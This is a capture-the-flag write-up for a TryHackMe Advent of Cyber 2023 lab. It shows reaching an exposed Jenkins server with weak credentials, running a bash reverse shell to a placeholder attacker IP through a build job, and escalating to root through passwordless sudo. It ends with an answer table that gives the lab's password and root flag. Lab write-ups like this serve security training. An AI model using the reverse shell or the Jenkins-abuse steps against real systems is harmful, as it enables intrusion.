# Advent of Cyber 2023 - Day 12: Defense in Depth

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Background
Auditing multi-tier architectures, finding exposed developer services (Jenkins), and breaking through missing internal segmentation.

## Walkthrough
1. Port scan identifies Jenkins running on default TCP port `8080`.
2. Accessing Jenkins reveals weak credentials for user `tracy`: `13_1n_33`.
3. In Jenkins, create a malicious build job executing a bash reverse shell:
   ```bash
   /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
   ```
4. Catch the shell on Netcat: `nc -lvnp 4444`.
5. Privilege escalation to root: Tracy has sudo permissions without password on all commands (`sudo -l`).
6. Run `sudo su` and capture root flag: `ezRo0tW1thoutDiD`.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| Default port for Jenkins? | `8080` |
| Password of the user tracy? | `13_1n_33` |
| Root flag? | `ezRo0tW1thoutDiD` |
